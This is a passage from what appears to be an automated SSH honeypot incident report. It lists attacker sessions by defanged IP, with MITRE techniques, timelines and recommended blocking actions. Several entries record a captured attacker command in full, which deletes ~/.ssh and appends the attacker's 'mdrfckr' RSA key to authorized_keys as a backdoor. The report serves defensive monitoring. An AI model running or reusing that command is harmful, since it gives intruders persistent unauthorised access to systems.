| `2026-06-02 16:22:41` | `cowrie.client.kex` |
| `2026-06-02 16:22:42` | `cowrie.login.success` |
| `2026-06-02 16:22:42` | `cowrie.session.params` |
| `2026-06-02 16:22:42` | `cowrie.command.input` |
| `2026-06-02 16:22:42` | `cowrie.command.failed` |
| `2026-06-02 16:22:42` | `cowrie.log.closed` |
| `2026-06-02 16:22:42` | `cowrie.session.params` |
| `2026-06-02 16:22:42` | `cowrie.command.input` |
| `2026-06-02 16:22:42` | `cowrie.session.file_download` |
| `2026-06-02 16:22:42` | `cowrie.log.closed` |
| `2026-06-02 16:22:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.75.64[.]35` to AbuseIPDB if not already reported
- [ ] Block `51.75.64[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-869d3b7332ba

| Field | Detail |
|---|---|
| **Source IP** | `51.75.64[.]35` |
| **First Seen** | 2026-06-02 16:22 |
| **Last Seen** | 2026-06-02 16:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 16:22:44` | `cowrie.session.connect` |
| `2026-06-02 16:22:44` | `cowrie.client.version` |
| `2026-06-02 16:22:44` | `cowrie.client.kex` |
| `2026-06-02 16:22:45` | `cowrie.login.success` |
| `2026-06-02 16:22:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.75.64[.]35` to AbuseIPDB if not already reported
- [ ] Block `51.75.64[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e4ff0bcdeba

| Field | Detail |
|---|---|
| **Source IP** | `51.75.64[.]35` |
| **First Seen** | 2026-06-02 16:25 |
| **Last Seen** | 2026-06-02 16:25 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 16:25:37` | `cowrie.session.connect` |
| `2026-06-02 16:25:37` | `cowrie.client.version` |
| `2026-06-02 16:25:37` | `cowrie.client.kex` |
| `2026-06-02 16:25:38` | `cowrie.login.success` |
| `2026-06-02 16:25:38` | `cowrie.session.params` |
| `2026-06-02 16:25:38` | `cowrie.command.input` |
| `2026-06-02 16:25:38` | `cowrie.command.failed` |
| `2026-06-02 16:25:38` | `cowrie.log.closed` |
| `2026-06-02 16:25:38` | `cowrie.session.params` |
| `2026-06-02 16:25:38` | `cowrie.command.input` |
| `2026-06-02 16:25:39` | `cowrie.session.file_download` |
| `2026-06-02 16:25:39` | `cowrie.log.closed` |
| `2026-06-02 16:25:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.75.64[.]35` to AbuseIPDB if not already reported
- [ ] Block `51.75.64[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e5dfa6a4871

| Field | Detail |
|---|---|
| **Source IP** | `51.75.64[.]35` |
| **First Seen** | 2026-06-02 16:25 |
| **Last Seen** | 2026-06-02 16:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 16:25:41` | `cowrie.session.connect` |
| `2026-06-02 16:25:41` | `cowrie.client.version` |
| `2026-06-02 16:25:41` | `cowrie.client.kex` |
| `2026-06-02 16:25:41` | `cowrie.login.success` |
| `2026-06-02 16:25:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.75.64[.]35` to AbuseIPDB if not already reported
- [ ] Block `51.75.64[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5f753095381

| Field | Detail |
|---|---|
| **Source IP** | `195.199.210[.]194` |
| **First Seen** | 2026-06-02 16:28 |
| **Last Seen** | 2026-06-02 16:28 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 16:28:27` | `cowrie.session.connect` |
| `2026-06-02 16:28:27` | `cowrie.client.version` |
| `2026-06-02 16:28:27` | `cowrie.client.kex` |
| `2026-06-02 16:28:28` | `cowrie.login.success` |
| `2026-06-02 16:28:28` | `cowrie.session.params` |
| `2026-06-02 16:28:28` | `cowrie.command.input` |
| `2026-06-02 16:28:28` | `cowrie.command.failed` |
| `2026-06-02 16:28:28` | `cowrie.log.closed` |
| `2026-06-02 16:28:29` | `cowrie.session.params` |
| `2026-06-02 16:28:29` | `cowrie.command.input` |
| `2026-06-02 16:28:29` | `cowrie.session.file_download` |
| `2026-06-02 16:28:29` | `cowrie.log.closed` |
| `2026-06-02 16:28:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.199.210[.]194` to AbuseIPDB if not already reported
- [ ] Block `195.199.210[.]194` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd256c90b594

| Field | Detail |
|---|---|
| **Source IP** | `195.199.210[.]194` |
| **First Seen** | 2026-06-02 16:28 |
| **Last Seen** | 2026-06-02 16:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 16:28:31` | `cowrie.session.connect` |
| `2026-06-02 16:28:31` | `cowrie.client.version` |
| `2026-06-02 16:28:32` | `cowrie.client.kex` |
| `2026-06-02 16:28:32` | `cowrie.login.success` |
| `2026-06-02 16:28:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.199.210[.]194` to AbuseIPDB if not already reported
- [ ] Block `195.199.210[.]194` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d77771b3804c

| Field | Detail |
|---|---|
| **Source IP** | `195.199.210[.]194` |
| **First Seen** | 2026-06-02 16:30 |
| **Last Seen** | 2026-06-02 16:30 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 16:30:11` | `cowrie.session.connect` |
| `2026-06-02 16:30:11` | `cowrie.client.version` |
| `2026-06-02 16:30:12` | `cowrie.client.kex` |
| `2026-06-02 16:30:12` | `cowrie.login.success` |
| `2026-06-02 16:30:13` | `cowrie.session.params` |
| `2026-06-02 16:30:13` | `cowrie.command.input` |
| `2026-06-02 16:30:13` | `cowrie.command.failed` |
| `2026-06-02 16:30:13` | `cowrie.log.closed` |
| `2026-06-02 16:30:14` | `cowrie.session.params` |
| `2026-06-02 16:30:14` | `cowrie.command.input` |
| `2026-06-02 16:30:14` | `cowrie.session.file_download` |
| `2026-06-02 16:30:14` | `cowrie.log.closed` |
| `2026-06-02 16:30:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.199.210[.]194` to AbuseIPDB if not already reported
- [ ] Block `195.199.210[.]194` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8bea7d8860f

| Field | Detail |
|---|---|
| **Source IP** | `195.199.210[.]194` |
| **First Seen** | 2026-06-02 16:30 |
| **Last Seen** | 2026-06-02 16:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 16:30:16` | `cowrie.session.connect` |
| `2026-06-02 16:30:16` | `cowrie.client.version` |
| `2026-06-02 16:30:16` | `cowrie.client.kex` |
| `2026-06-02 16:30:17` | `cowrie.login.success` |
| `2026-06-02 16:30:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.199.210[.]194` to AbuseIPDB if not already reported
- [ ] Block `195.199.210[.]194` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-588210010c65

| Field | Detail |
|---|---|
| **Source IP** | `1.222.42[.]237` |
| **First Seen** | 2026-06-02 16:30 |
| **Last Seen** | 2026-06-02 16:30 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 16:30:17` | `cowrie.session.connect` |
| `2026-06-02 16:30:17` | `cowrie.client.version` |
| `2026-06-02 16:30:18` | `cowrie.client.kex` |
| `2026-06-02 16:30:18` | `cowrie.login.success` |
| `2026-06-02 16:30:18` | `cowrie.session.params` |
| `2026-06-02 16:30:18` | `cowrie.command.input` |
| `2026-06-02 16:30:18` | `cowrie.command.failed` |
| `2026-06-02 16:30:19` | `cowrie.log.closed` |
| `2026-06-02 16:30:19` | `cowrie.session.params` |
| `2026-06-02 16:30:19` | `cowrie.command.input` |
| `2026-06-02 16:30:19` | `cowrie.session.file_download` |
| `2026-06-02 16:30:19` | `cowrie.log.closed` |
| `2026-06-02 16:30:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `1.222.42[.]237` to AbuseIPDB if not already reported
- [ ] Block `1.222.42[.]237` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-799db98987b0

| Field | Detail |
|---|---|
| **Source IP** | `1.222.42[.]237` |
| **First Seen** | 2026-06-02 16:30 |
| **Last Seen** | 2026-06-02 16:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 16:30:21` | `cowrie.session.connect` |
| `2026-06-02 16:30:21` | `cowrie.client.version` |
| `2026-06-02 16:30:21` | `cowrie.client.kex` |
| `2026-06-02 16:30:22` | `cowrie.login.success` |
| `2026-06-02 16:30:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `1.222.42[.]237` to AbuseIPDB if not already reported
- [ ] Block `1.222.42[.]237` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03bb097fd7d7

| Field | Detail |
|---|---|
| **Source IP** | `195.199.210[.]194` |
| **First Seen** | 2026-06-02 16:32 |
| **Last Seen** | 2026-06-02 16:32 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 16:32:00` | `cowrie.session.connect` |
| `2026-06-02 16:32:00` | `cowrie.client.version` |
| `2026-06-02 16:32:00` | `cowrie.client.kex` |
| `2026-06-02 16:32:01` | `cowrie.login.success` |
| `2026-06-02 16:32:02` | `cowrie.session.params` |
| `2026-06-02 16:32:02` | `cowrie.command.input` |
| `2026-06-02 16:32:02` | `cowrie.command.failed` |
| `2026-06-02 16:32:02` | `cowrie.log.closed` |
| `2026-06-02 16:32:02` | `cowrie.session.params` |
| `2026-06-02 16:32:02` | `cowrie.command.input` |
| `2026-06-02 16:32:02` | `cowrie.session.file_download` |
| `2026-06-02 16:32:02` | `cowrie.log.closed` |
| `2026-06-02 16:32:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.199.210[.]194` to AbuseIPDB if not already reported
- [ ] Block `195.199.210[.]194` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-987045b69dbb

| Field | Detail |
|---|---|
| **Source IP** | `195.199.210[.]194` |
| **First Seen** | 2026-06-02 16:32 |
| **Last Seen** | 2026-06-02 16:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 16:32:05` | `cowrie.session.connect` |
| `2026-06-02 16:32:05` | `cowrie.client.version` |
| `2026-06-02 16:32:05` | `cowrie.client.kex` |
| `2026-06-02 16:32:06` | `cowrie.login.success` |
| `2026-06-02 16:32:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.199.210[.]194` to AbuseIPDB if not already reported
- [ ] Block `195.199.210[.]194` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8264f0fbebd

| Field | Detail |
|---|---|
| **Source IP** | `51.75.64[.]35` |
| **First Seen** | 2026-06-02 16:32 |
| **Last Seen** | 2026-06-02 16:32 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 16:32:34` | `cowrie.session.connect` |
| `2026-06-02 16:32:34` | `cowrie.client.version` |
| `2026-06-02 16:32:34` | `cowrie.client.kex` |
| `2026-06-02 16:32:35` | `cowrie.login.success` |
| `2026-06-02 16:32:35` | `cowrie.session.params` |
| `2026-06-02 16:32:35` | `cowrie.command.input` |
| `2026-06-02 16:32:35` | `cowrie.command.failed` |
| `2026-06-02 16:32:35` | `cowrie.log.closed` |
| `2026-06-02 16:32:35` | `cowrie.session.params` |
| `2026-06-02 16:32:35` | `cowrie.command.input` |
| `2026-06-02 16:32:35` | `cowrie.session.file_download` |
| `2026-06-02 16:32:35` | `cowrie.log.closed` |
| `2026-06-02 16:32:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.75.64[.]35` to AbuseIPDB if not already reported
- [ ] Block `51.75.64[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-895092a96b8b

| Field | Detail |
|---|---|
| **Source IP** | `51.75.64[.]35` |
| **First Seen** | 2026-06-02 16:32 |
| **Last Seen** | 2026-06-02 16:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 16:32:37` | `cowrie.session.connect` |
| `2026-06-02 16:32:37` | `cowrie.client.version` |
| `2026-06-02 16:32:38` | `cowrie.client.kex` |
| `2026-06-02 16:32:38` | `cowrie.login.success` |
| `2026-06-02 16:32:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.75.64[.]35` to AbuseIPDB if not already reported
- [ ] Block `51.75.64[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75699c64b225

| Field | Detail |
|---|---|
| **Source IP** | `195.199.210[.]194` |
| **First Seen** | 2026-06-02 16:33 |
| **Last Seen** | 2026-06-02 16:33 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 16:33:43` | `cowrie.session.connect` |
| `2026-06-02 16:33:43` | `cowrie.client.version` |
| `2026-06-02 16:33:43` | `cowrie.client.kex` |
| `2026-06-02 16:33:44` | `cowrie.login.success` |
| `2026-06-02 16:33:45` | `cowrie.session.params` |
| `2026-06-02 16:33:45` | `cowrie.command.input` |
| `2026-06-02 16:33:45` | `cowrie.command.failed` |
| `2026-06-02 16:33:45` | `cowrie.log.closed` |
| `2026-06-02 16:33:45` | `cowrie.session.params` |
| `2026-06-02 16:33:45` | `cowrie.command.input` |
| `2026-06-02 16:33:45` | `cowrie.session.file_download` |
| `2026-06-02 16:33:45` | `cowrie.log.closed` |
| `2026-06-02 16:33:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.199.210[.]194` to AbuseIPDB if not already reported
- [ ] Block `195.199.210[.]194` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-266b03ab4948

| Field | Detail |
|---|---|
| **Source IP** | `195.199.210[.]194` |
| **First Seen** | 2026-06-02 16:33 |
| **Last Seen** | 2026-06-02 16:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 16:33:48` | `cowrie.session.connect` |
| `2026-06-02 16:33:48` | `cowrie.client.version` |
| `2026-06-02 16:33:48` | `cowrie.client.kex` |
| `2026-06-02 16:33:49` | `cowrie.login.success` |
| `2026-06-02 16:33:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.199.210[.]194` to AbuseIPDB if not already reported
- [ ] Block `195.199.210[.]194` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `92.204.138[.]44` | **47** | 2026-06-02 11:20 | 2026-06-02 14:15 | 23m | 0 | `T1592` | 🟠 MEDIUM |
| `192.169.179[.]77` | **32** | 2026-06-02 12:22 | 2026-06-02 15:14 | 16m | 0 | `T1592` | 🟠 MEDIUM |
| `101.79.165[.]43` | **30** | 2026-06-02 13:20 | 2026-06-02 14:24 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `103.172.20[.]218` | **30** | 2026-06-02 11:10 | 2026-06-02 11:56 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `182.93.50[.]90` | **30** | 2026-06-02 11:40 | 2026-06-02 13:08 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `49.64.85[.]138` | **30** | 2026-06-02 11:04 | 2026-06-02 11:33 | 42m | 8 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `51.75.64[.]35` | **30** | 2026-06-02 15:47 | 2026-06-02 16:32 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `195.199.210[.]194` | **28** | 2026-06-02 15:51 | 2026-06-02 16:39 | 0m | 28 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `172.191.239[.]155` | **20** | 2026-06-02 15:31 | 2026-06-02 16:12 | 0m | 20 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `57.128.214[.]238` | **20** | 2026-06-02 15:34 | 2026-06-02 16:06 | 0m | 20 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `92.113.142[.]203` | **17** | 2026-06-02 15:45 | 2026-06-02 16:16 | 0m | 17 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `180.76.147[.]226` | **12** | 2026-06-02 16:10 | 2026-06-02 16:37 | 10m | 1 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `78.89.154[.]59` | **10** | 2026-06-02 15:29 | 2026-06-02 15:58 | 0m | 9 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `115.190.251[.]242` | **6** | 2026-06-02 11:12 | 2026-06-02 12:42 | 11m | 0 | `T1592` | 🟢 LOW |
| `137.184.204[.]8` | **6** | 2026-06-02 10:42 | 2026-06-02 11:39 | 5m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]199` | **3** | 2026-06-02 12:31 | 2026-06-02 12:32 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]195` | **3** | 2026-06-02 12:31 | 2026-06-02 12:32 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]79` | **3** | 2026-06-02 12:30 | 2026-06-02 12:31 | 0m | 0 | `T1592` | 🟢 LOW |
| `135.237.127[.]190` | **2** | 2026-06-02 14:49 | 2026-06-02 14:49 | 0m | 0 | `T1592` | 🟢 LOW |
| `137.184.204[.]8` | **2** | 2026-06-02 13:56 | 2026-06-02 14:13 | 2m | 0 | `T1592` | 🟢 LOW |
| `47.250.81[.]7` | **2** | 2026-06-02 15:42 | 2026-06-02 15:43 | 0m | 0 | `T1592` | 🟢 LOW |
